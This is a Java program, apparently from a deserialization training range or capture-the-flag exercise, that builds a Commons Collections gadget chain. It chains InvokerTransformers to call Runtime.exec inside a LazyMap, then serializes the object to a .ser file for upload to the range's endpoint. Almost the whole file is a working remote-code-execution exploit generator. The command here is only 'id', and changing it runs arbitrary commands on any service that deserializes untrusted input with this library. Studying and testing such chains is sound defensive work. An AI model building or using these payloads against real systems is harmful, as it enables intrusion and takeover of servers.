package class10;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;
import com.ctfstu.common.Logger;

/**
 * 生成 class10 的 payload — LazyMap
 * 目标: 上传 LazyMap，靶场调用 lazyMap.get(任意key) 触发 ChainedTransformer
 * 靶场: /class10/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Logger.setLogLevel(Logger.DEBUG);
        Transformer[] chain = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"id"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(chain);
        Map uselessMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class10.ser"));
        oos.writeObject(lazyMap);
        oos.close();

        System.out.println("✅ 已生成: class10.ser");
    }
}
